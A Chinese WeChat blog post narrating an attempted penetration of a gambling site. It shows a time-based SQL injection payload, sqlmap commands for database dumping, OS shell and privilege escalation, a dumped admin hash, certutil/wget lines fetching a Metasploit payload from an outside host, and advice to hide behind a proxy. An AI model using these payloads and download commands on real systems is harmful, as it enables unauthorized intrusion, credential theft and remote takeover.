---
title: 巧用BP渗透BC
url: https://mp.weixin.qq.com/s/Uz_CwIUCFhDTHV3Kkhl41g
source: Doonsec's feed
date: 2026-04-13
fetch_date: 2026-04-14T04:40:23.649251
---

# 巧用BP渗透BC

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wjv842W2fpcvzGXIL67fjko2g0ITmeyviadtRR3kzn1tdzeV6xZAoja1cor0V3zMlUBaf6ToW596nb8OnFa2A8A/0?wx_fmt=jpeg)

# 巧用BP渗透BC

安锐信安全攻防实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于F5安全团队
，作者江南F5安全团队

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6pb4Aiba08Ucia91ES9xtShGXjYxdk5Vc3Yl6VqsvpVkEA/0)

**F5安全团队**
.

单丝不成线，独木不成林.

```
本公众号“F5安全团队”仅分享网络安全领域的相关知识，仅限于学习，不得用于非法活动，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
```

## 一，前言

今天又是个愉快的一天，本来还吃着晚饭呢，突然小学妹给我发消息了，我直接就是起立了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvjBTXPLUiakSdnhGLFHsicuDyAdQBXwvcJibxrEJjXjFVzJpTmfwV0e3Rg/640?wx_fmt=png&from=appmsg)

学妹的诱惑，我根本扛不住，必须开搞！

在从食堂回老巢的路上，我都在幻想，小学妹嘿嘿嘿,大家都懂，嘻嘻~

## 二，渗透过程

通过全球ping发现此站点存在CDN无法绕过，于是从web点入手

通过burp的主动扫描模块扫出站点存在SQL和JAVA(dom)注入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvqxkwrGRUlATiaMibicUW9GlG8BibzAC2Qbxzvya2tSYCJonuof9rfSicsIQ/640?wx_fmt=png&from=appmsg)

检测到vist\_num存在注入点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyv51Wao9TIMxtWPncOCAUsOo9EFbEiacjQicQMGJJFOibia1j202yRrVeZCw/640?wx_fmt=png&from=appmsg)

通过报错提升这里可能存在延时注入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvkuj2x74bia5XrjicicLFS34WPeuiaohnB2FPbVleQzjVHby9pzD9aJCLhA/640?wx_fmt=png&from=appmsg)

```
技术参考文章：http://www.taodudu.cc/news/show-1538666.html?action=onClick
```

但是尝试了各种手法最终还是没有绕过

bp主动扫描跑出来的第三次的请求：visit\_num=(select\*from(select(sleep(20)))a);，探测一下waf的种类，是一款国外云的waf，尝试绕过

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyv9Z4thjtstg6mgceFD08Hq4PjXvaVMSEosgC5KCYFs5H5bllO8rzicFA/640?wx_fmt=png&from=appmsg)

sqlmap走你老弟!

python sqlmap.py -r 1.txt --level 3 --risk 5 --dbs --delay --dbms=mysql

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvM8kDIhVLvcF8tWEia29AU1ErnibLibvqaXHbKmfgg5FvSeFpzeqfmxCBQ/640?wx_fmt=png&from=appmsg)

admin 0ff22ae5a245eda021f965c58f8b2136 vXT9Wu（加盐了）

udf提权直接--os-shell获得系统权限了（但是没有提到system）

这里应该是调用了sys\_eval和sys\_exec的函数进行了udf提权（还是没有成功）![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvA3vTQ7097wtU6zpv5DKBLEAicicposmGyQ1DsKX9l5jAoiavs8VLicib00Q/640?wx_fmt=png&from=appmsg)

不知道为啥执行了命令不回显，估计没有权限![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvEcopLjXnaibpGFq6c2AQq1EX2O4dnicwsfJHxcbqDrU4kCBEb1fAwuNA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyv3ibErr5tKQob841E3cd806P87wJGahFkjbbuLDqB1AibhAXia4QicCwScw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvqJUfy34ULAqcjhjuKFkyFKugPzmo5O2SJLrXFkpM13fDD7iacj5CPDQ/640?wx_fmt=png&from=appmsg)

--priv-esc 尝试提升权限

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvfbVEORl1drlp7ic52ooMJ8EJSFpf1HxA8bDo1a1eYMKwBTagPxRgvTA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvDJ0YJbDuNe0D4Zg8SJRyxnnSTibaBhHHibRC5cNOozQmlIz3hib2H0pPw/640?wx_fmt=png&from=appmsg)

直接上传无果，权限不足

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvFoEkJOyauKBS3gM55SRsQFJz7zMvDjqpTib8ysuOs6emaoQiaXQp3GEA/640?wx_fmt=png&from=appmsg)

--current-user查看当前数据库权限，我就说，难怪

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyv2mt9PDPyReIxFAP5uCQDTWlF4QRxG2UYeiaDmkElYp4IWZlomTJESmw/640?wx_fmt=png&from=appmsg)

尝试DNS外带数据回显，这也没有用![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvsRORqzKNc2fBoV0dZajSUxyicxdiaOr62I6BILCuHduWRxbbS1MjFwRg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvQbSOs5RIsCBDIJptNGa6gnTVdQgWJibcVct6ghM8BXkLDFVOhP4Erjw/640?wx_fmt=png&from=appmsg)

```
https://cn-sec.com/archives/504769.html（可借鉴）
```

sqlmap反弹shell到msf

```
windows：certutil.exe --urlcache --splist -f http://4*.***.***.*5:8081/msf.exe '\www\wwwroot\msf.exe'
linux：wget http://4*.***.***.*5:8081/msf.elf '\www\wwwroot\msf.elf'
```

前提开好代理防止本地物理机被溯源![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyv7afohs6UeoTKaTtEt3VH1nUKFDGVCYlIMgIAaGUJynZia77hh8niaHibA/640?wx_fmt=png&from=appmsg)

msf开监听![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvcGAw00icU8etyib3AJ5CRCzaOxPrlKSFHKQ3VomLxp3TibYNvAFibV73jA/640?wx_fmt=png&from=appmsg)

最后还是没拿到shell，让小学妹失望了![](https://mmbiz.qpic.cn/sz_mmbiz_png/wjv842W2fpcvzGXIL67fjko2g0ITmeyvguaiaziaZbgsINa7FYYyFicpOytB1FficN8cRffgtgl7zwzrPbiaA7ibBsiaA/640?wx_fmt=png&from=appmsg)

最终：学妹wx还是拿到了，嘿嘿，拜拜，找学妹去咯~~!

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/6CibLpliaRicnInQKulaWAIrlF6GiaAKqGGedAJna0VPyjDuEbc3J1ftfjzic5XjQjX7qKVic11JbLcd1C9I7BYVsHs9rQRP47HTcc9xKyJnBbF3k/0?wx_fmt=png)

安锐信安全攻防实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/6CibLpliaRicnInQKulaWAIrlF6GiaAKqGGedAJna0VPyjDuEbc3J1ftfjzic5XjQjX7qKVic11JbLcd1C9I7BYVsHs9rQRP47HTcc9xKyJnBbF3k/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过